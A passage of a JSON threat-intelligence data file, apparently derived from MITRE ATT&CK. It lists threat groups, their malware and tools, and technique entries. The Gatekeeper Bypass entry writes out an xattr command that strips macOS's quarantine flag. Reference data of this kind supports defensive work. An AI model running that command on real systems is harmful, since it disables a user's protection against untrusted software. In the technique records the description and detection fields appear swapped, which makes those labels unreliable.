                ],
                "techniques": {
                    "T1572": "Protocol Tunneling"
                }
            },
            "val": 1
        },
        {
            "id": "S0169",
            "type": "tool",
            "attributes": {
                "name": "RawPOS",
                "aliases": [
                    "FIENDCRY",
                    "DUEBREW",
                    "DRIFTWOOD"
                ],
                "labels": [
                    "malware"
                ],
                "description": "RawPOS is a point-of-sale (POS) malware family that searches for cardholder data on victims. It has been in use since at least 2008.    FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and DRIFTWOOD.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1560.003": "Archive via Custom Method",
                    "T1036.004": "Masquerade Task or Service",
                    "T1543.003": "Windows Service",
                    "T1005": "Data from Local System"
                }
            },
            "val": 5
        },
        {
            "id": "G0059",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Magic Hound",
                "aliases": [
                    "COBALT ILLUSION",
                    "Charming Kitten",
                    "ITG18",
                    "Phosphorus",
                    "Newscaster",
                    "APT35"
                ],
                "description": "Magic Hound is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, dating back as early as 2014. The group typically targets U.S. and Middle Eastern military organizations, as well as other government personnel, via complex social engineering campaigns.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0192": "Pupy",
                    "S0186": "DownPaper",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1589.001": "Credentials",
                    "T1586.002": "Email Accounts",
                    "T1585.002": "Email Accounts",
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1571": "Non-Standard Port",
                    "T1564.003": "Hidden Window",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.002": "Spearphishing Link",
                    "T1560.001": "Archive via Utility",
                    "T1114.001": "Local Email Collection",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1098.002": "Exchange Email Delegate Permissions",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1071": "Application Layer Protocol",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "S0186",
            "type": "tool",
            "attributes": {
                "name": "DownPaper",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "DownPaper is a backdoor Trojan; its main functionality is to download and run second stage malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 7
        },
        {
            "id": "G0060",
            "type": "group",
            "attributes": {
                "val": 14,
                "name": "BRONZE BUTLER",
                "aliases": [
                    "REDBALDKNIGHT",
                    "Tick"
                ],
                "description": "BRONZE BUTLER is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0596": "ShadowPad",
                    "S0473": "Avenger",
                    "S0472": "down_new",
                    "S0471": "build_downer",
                    "S0470": "BBK",
                    "S0469": "ABK",
                    "S0187": "Daserf",
                    "S0111": "schtasks",
                    "S0110": "at",
                    "S0106": "cmd",
                    "S0039": "Net",
                    "S0008": "gsecdump",
                    "S0005": "Windows Credential Editor",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1102.001": "Dead Drop Resolver",
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.002": "Domain Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1560.001": "Archive via Utility",
                    "T1003.001": "LSASS Memory",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.002": "Right-to-Left Override",
                    "T1027.003": "Steganography",
                    "T1027.001": "Binary Padding",
                    "T1070.004": "File Deletion",
                    "T1550.003": "Pass the Ticket",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1053.002": "At (Windows)",
                    "T1518": "Software Discovery",
                    "T1189": "Drive-by Compromise",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1080": "Taint Shared Content",
                    "T1039": "Data from Network Shared Drive",
                    "T1036": "Masquerading",
                    "T1018": "Remote System Discovery",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0473",
            "type": "tool",
            "attributes": {
                "name": "Avenger",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Avenger is a downloader that has been used by BRONZE BUTLER since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1518.001": "Security Software Discovery",
                    "T1027.003": "Steganography",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 11
        },
        {
            "id": "S0472",
            "type": "tool",
            "attributes": {
                "name": "down_new",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "down_new is a downloader that has been used by BRONZE BUTLER since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1518.001": "Security Software Discovery",
                    "T1518": "Software Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 10
        },
        {
            "id": "S0471",
            "type": "tool",
            "attributes": {
                "name": "build_downer",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "build_downer is a downloader that has been used by BRONZE BUTLER since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1518.001": "Security Software Discovery",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.003": "Steganography",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1124": "System Time Discovery",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "S0470",
            "type": "tool",
            "attributes": {
                "name": "BBK",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BBK is a downloader that has been used by BRONZE BUTLER since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1027.003": "Steganography",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1055": "Process Injection"
                }
            },
            "val": 7
        },
        {
            "id": "S0469",
            "type": "tool",
            "attributes": {
                "name": "ABK",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ABK is a downloader that has been used by BRONZE BUTLER since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1518.001": "Security Software Discovery",
                    "T1027.003": "Steganography",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1055": "Process Injection"
                }
            },
            "val": 7
        },
        {
            "id": "S0187",
            "type": "tool",
            "attributes": {
                "name": "Daserf",
                "aliases": [
                    "Muirim",
                    "Nioupale"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Daserf is a backdoor that has been used to spy on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. Researchers have identified versions written in both Visual C and Delphi.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1027.005": "Indicator Removal from Tools",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1001.002": "Steganography",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1560.001": "Archive via Utility",
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 16
        },
        {
            "id": "S0008",
            "type": "tool",
            "attributes": {
                "name": "gsecdump",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "gsecdump is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.004": "LSA Secrets",
                    "T1003.002": "Security Account Manager"
                }
            },
            "val": 2
        },
        {
            "id": "G0055",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "NEODYMIUM",
                "aliases": [],
                "description": "NEODYMIUM is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called PROMETHIUM due to overlapping victim and campaign characteristics.   NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0176": "Wingbird"
                },
                "techniques": {}
            }
        },
        {
            "id": "S0176",
            "type": "tool",
            "attributes": {
                "name": "Wingbird",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Wingbird is a backdoor that appears to be a version of commercial software FinFisher. It is reportedly used to attack individual computers instead of networks. It was used by NEODYMIUM in a May 2016 campaign.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1574.002": "DLL Side-Loading",
                    "T1569.002": "Service Execution",
                    "T1518.001": "Security Software Discovery",
                    "T1070.004": "File Deletion",
                    "T1547.008": "LSASS Driver",
                    "T1543.003": "Windows Service",
                    "T1082": "System Information Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1055": "Process Injection"
                }
            },
            "val": 9
        },
        {
            "id": "G0050",
            "type": "group",
            "attributes": {
                "val": 13,
                "name": "APT32",
                "aliases": [
                    "SeaLotus",
                    "OceanLotus",
                    "APT-C-00"
                ],
                "description": "APT32 is a threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as with foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims. The group is believed to be Vietnam-based.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0477": "Goopy",
                    "S0354": "Denis",
                    "S0352": "OSX_OCEANLOTUS.D",
                    "S0158": "PHOREAL",
                    "S0156": "KOMPROGO",
                    "S0155": "WINDSHIELD",
                    "S0157": "SOUNDBITE",
                    "S0154": "Cobalt Strike",
                    "S0108": "netsh",
                    "S0100": "ipconfig",
                    "S0099": "Arp",
                    "S0039": "Net",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1608.004": "Drive-by Target",
                    "T1608.001": "Upload Malware",
                    "T1598.003": "Spearphishing Link",
                    "T1589.002": "Email Addresses",
                    "T1589": "Gather Victim Identity Information",
                    "T1585.001": "Social Media Accounts",
                    "T1583.006": "Web Services",
                    "T1583.001": "Domains",
                    "T1059.007": "JavaScript",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1571": "Non-Standard Port",
                    "T1564.004": "NTFS File Attributes",
                    "T1564.003": "Hidden Window",
                    "T1078.003": "Local Accounts",
                    "T1574.002": "DLL Side-Loading",
                    "T1570": "Lateral Tool Transfer",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1569.002": "Service Execution",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1087.001": "Local Account",
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1036.003": "Rename System Utilities",
                    "T1027.001": "Binary Padding",
                    "T1222.002": "Linux and Mac File and Directory Permissions Modification",
                    "T1552.002": "Credentials in Registry",
                    "T1216.001": "PubPrn",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1550.003": "Pass the Ticket",
                    "T1550.002": "Pass the Hash",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.010": "Regsvr32",
                    "T1218.005": "Mshta",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1189": "Drive-by Compromise",
                    "T1203": "Exploitation for Client Execution",
                    "T1137": "Office Application Startup",
                    "T1135": "Network Share Discovery",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1072": "Software Deployment Tools",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1065": "Uncommonly Used Port",
                    "T1059": "Command and Scripting Interpreter",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1036": "Masquerading",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1003": "OS Credential Dumping"
                }
            }
        },
        {
            "id": "S0477",
            "type": "tool",
            "attributes": {
                "name": "Goopy",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Goopy is a Windows backdoor and Trojan used by APT32 and shares several similarities to another backdoor used by the group (Denis). Goopy is named for its impersonation of the legitimate Google Updater executable.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1574.002": "DLL Side-Loading",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1562.001": "Disable or Modify Tools",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.001": "Binary Padding",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1106": "Native API",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            },
            "val": 18
        },
        {
            "id": "T1560.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Archive via Library",
                "chain_phase": "collection",
                "description": "Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)",
                "detection": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0354",
            "type": "tool",
            "attributes": {
                "name": "Denis",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Denis is a Windows backdoor and Trojan used by APT32. Denis shares several similarities to the SOUNDBITE backdoor and has been used in conjunction with the Goopy backdoor.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1132.001": "Standard Encoding",
                    "T1574.002": "DLL Side-Loading",
                    "T1574": "Hijack Execution Flow",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1497.001": "System Checks",
                    "T1560.002": "Archive via Library",
                    "T1070.004": "File Deletion",
                    "T1055.012": "Process Hollowing",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 19
        },
        {
            "id": "T1553.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Gatekeeper Bypass",
                "chain_phase": "defense-evasion",
                "description": "Monitoring for the removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
                "detection": "Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \n\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, it is possible to avoid setting this flag using Drive-by Compromise. This completely bypasses the built-in Gatekeeper check.  The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>.  \n \nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "T1543.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Launch Daemon",
                "chain_phase": "persistence",
                "description": "Monitor for launch daemon creation or modification through plist files and utilities such as Objective-See's KnockKnock application. ",
                "detection": "Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> . These LaunchDaemons have property list files which point to the executables that will be launched . \n\nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  . The daemon name may be disguised by using a name from a related operating system or benign software . Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. \n\nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "S0352",
            "type": "tool",
            "attributes": {
                "name": "OSX_OCEANLOTUS.D",
                "aliases": [
                    "Backdoor.MacOS.OCEANLOTUS.F"
                ],
                "labels": [
                    "malware"
                ],
                "description": "OSX_OCEANLOTUS.D is a MacOS backdoor with several variants that has been used by APT32.",
                "platforms": [
                    "macOS"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.005": "Visual Basic",
                    "T1059.004": "Unix Shell",
                    "T1059.001": "PowerShell",
                    "T1497.001": "System Checks",
                    "T1564.001": "Hidden Files and Directories",
                    "T1560": "Archive Collected Data",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.001": "Gatekeeper Bypass",
                    "T1027.002": "Software Packing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1543.004": "Launch Daemon",
                    "T1543.001": "Launch Agent",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 19
        },
        {
            "id": "S0158",
            "type": "tool",
            "attributes": {
                "name": "PHOREAL",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PHOREAL is a signature backdoor used by APT32.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1112": "Modify Registry",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol"
                }
            },
            "val": 4
        },
        {
            "id": "S0156",
            "type": "tool",
            "attributes": {
                "name": "KOMPROGO",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "KOMPROGO is a signature backdoor used by APT32 that is capable of process, file, and registry management.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1082": "System Information Discovery",
                    "T1047": "Windows Management Instrumentation"
                }
            },
            "val": 3
        },
        {
            "id": "S0155",
            "type": "tool",
            "attributes": {
                "name": "WINDSHIELD",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WINDSHIELD is a signature backdoor used by APT32.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1070.004": "File Deletion",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 6
        },
        {
            "id": "S0157",
            "type": "tool",
            "attributes": {
                "name": "SOUNDBITE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SOUNDBITE is a signature backdoor used by APT32.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1112": "Modify Registry",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 5
        },
        {
            "id": "G0051",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "FIN10",
                "aliases": [],
                "description": "FIN10 is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0363": "Empire"
                },
                "techniques": {
                    "T1078.003": "Local Accounts",
                    "T1570": "Lateral Tool Transfer",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1078": "Valid Accounts",
                    "T1033": "System Owner/User Discovery"
                }
            }
        },
        {
            "id": "G0049",
            "type": "group",
            "attributes": {
                "val": 20,
                "name": "OilRig",
                "aliases": [
                    "COBALT GYPSY",
                    "IRN2",
                    "HELIX KITTEN",
                    "APT34"
                ],
                "description": "OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.       This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0495": "RDAT",
                    "S0360": "BONDUPDATER",
                    "S0349": "LaZagne",
                    "S0264": "OopsIE",
                    "S0269": "QUADAGENT",
                    "S0258": "RGDoor",
                    "S0185": "SEASHARPEE",
                    "S0189": "ISMInjector",
                    "S0184": "POWRUNER",
                    "S0170": "Helminth",
                    "S0160": "certutil",
                    "S0104": "netstat",
                    "S0100": "ipconfig",
                    "S0096": "Systeminfo",
                    "S0095": "FTP",
                    "S0075": "Reg",
                    "S0057": "Tasklist",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1572": "Protocol Tunneling",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1069.001": "Local Groups",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1003.004": "LSA Secrets",
                    "T1003.005": "Cached Domain Credentials",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1003.001": "LSASS Memory",
                    "T1021.004": "SSH",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1552.001": "Credentials In Files",
                    "T1070.004": "File Deletion",
                    "T1218.001": "Compiled HTML File",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1137.004": "Outlook Home Page",
                    "T1201": "Password Policy Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1133": "External Remote Services",
                    "T1119": "Automated Collection",
                    "T1113": "Screen Capture",
                    "T1110": "Brute Force",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1008": "Fallback Channels",
                    "T1007": "System Service Discovery",
                    "T0853": "Scripting",
                    "T0869": "Standard Application Layer Protocol",
                    "T0859": "Valid Accounts",
                    "T0865": "Spearphishing Attachment",
                    "T0817": "Drive-by Compromise"
                }
            }
        },
        {
            "id": "T1030",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Transfer Size Limits",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0495",
            "type": "tool",
            "attributes": {
                "name": "RDAT",
                "aliases": [
                    "RDAT "
                ],
                "labels": [
                    "malware"
                ],
                "description": "RDAT is a backdoor used by the suspected Iranian threat group OilRig. RDAT was originally identified in 2017 and targeted companies in the telecommunications sector.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1001.002": "Steganography",
                    "T1132.002": "Non-Standard Encoding",
                    "T1132.001": "Standard Encoding",
